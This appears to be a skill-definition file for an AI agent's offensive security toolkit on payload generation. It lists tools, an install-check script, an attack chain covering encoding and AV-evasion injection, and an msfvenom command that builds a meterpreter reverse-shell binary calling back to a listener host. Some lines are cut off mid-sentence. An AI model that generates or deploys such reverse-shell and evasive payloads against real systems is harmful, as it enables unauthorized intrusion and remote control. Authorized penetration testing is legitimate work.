---
name: chiper-payload-generation
description: "Use when Payload generation covers the creation, encoding, and delivery of shellcode and executable payloads for initial access and command-and-control (C2) communicatio"
version: "0.2.0"
author: Chiper (Chiper-Cyber)
metadata:
  Chiper:
    tags: [pentest, security, kali-linux, chiper-cyber, payload, generation]
references:
  - path: ~/.Chiper/skills/chiper-cyber/chiper-payload-generation/SKILL.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-payload-generation/payloads.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-payload-generation/test-cases.md
  - path: ~/.Chiper/skills/chiper-cyber/chiper-payload-generation/guides
---

# Payload Generation

## Prerequisites

> 💡 Missing tools? This skill will auto-check before execution.

**Required tools:**

- `msfvenom` — install: `sudo apt install -y metasploit-framework`
- `netcat` — install: `sudo apt install -y netcat-traditional`
- `socat` — install: `sudo apt install -y socat`

**Quick check (run before using this skill):**

```bash
# Check which tools are missing
MISSING=""
for cmd in msfvenom netcat socat; do
  command -v "$cmd" >/dev/null 2>&1 || MISSING="$MISSING $cmd"
done
if [ -n "$MISSING" ]; then
  echo "⚠️  Missing tools:$MISSING"
  echo "Install with:"
  command -v msfvenom >/dev/null 2>&1 || echo "  sudo apt install -y metasploit-framework"
  command -v netcat >/dev/null 2>&1 || echo "  sudo apt install -y netcat-traditional"
  command -v socat >/dev/null 2>&1 || echo "  sudo apt install -y socat"
else
  echo "✅ All tools installed"
fi
```

## When to Use

Payload Generation skill domain covering exploitation operations.

**Tools**: msfvenom, netcat, socat, nishang, hoaxshell, rlwrap, shellter

**Domain**: exploitation

**MITRE ATT&CK**: TA0007-Command and Control

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **msfvenom** | Payload generation for all platforms, encoders, formats, custom templates | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf` |
| **netcat** | Listener setup, revers

## Methodology Overview

### Attack Chain

```
[1] Target Analysis      [2] Payload Generation   [3] Encoding
  - Platform (Win/Lin/Mac)  - msfvenom format select   - shikata_ga_nai
  - Architecture (x86/x64)  - Staged vs stageless       - Multi-encoder chains
  - Available interpreters  - Meterpreter vs raw shell   - Shellter PE injection
  - Network restrictions      |                            |
      v               

## Instructions

Read the referenced chiper-cyber files for full methodology:
- **SKILL.md** — Step-by-step methodology, attack chain, tools, and defense perspective
- **payloads.md** — Ready-to-use attack payloads organized by type and technique
- **test-cases.md** — Structured test procedures with prerequisites and expected results
- **guides/** — Deep-dive learning materials and scripts

Full skill content at: `~/.Chiper/skills/chiper-cyber/chiper-payload-generation/`

## Examples

See `payloads.md` in the referenced directory for ready-to-use attack payloads.

## Test Cases

See `test-cases.md` in the referenced directory for structured test procedures.

## Notes

- Source: Chiper-Cyber v1.0.0 — Security Skills Ecosystem (Chiper 2026)
- Defense Triple: Defense Perspective + Detection Methods + Evasion Techniques
- Update: `cd ~/.Chiper/skills/chiper-cyber && git pull`
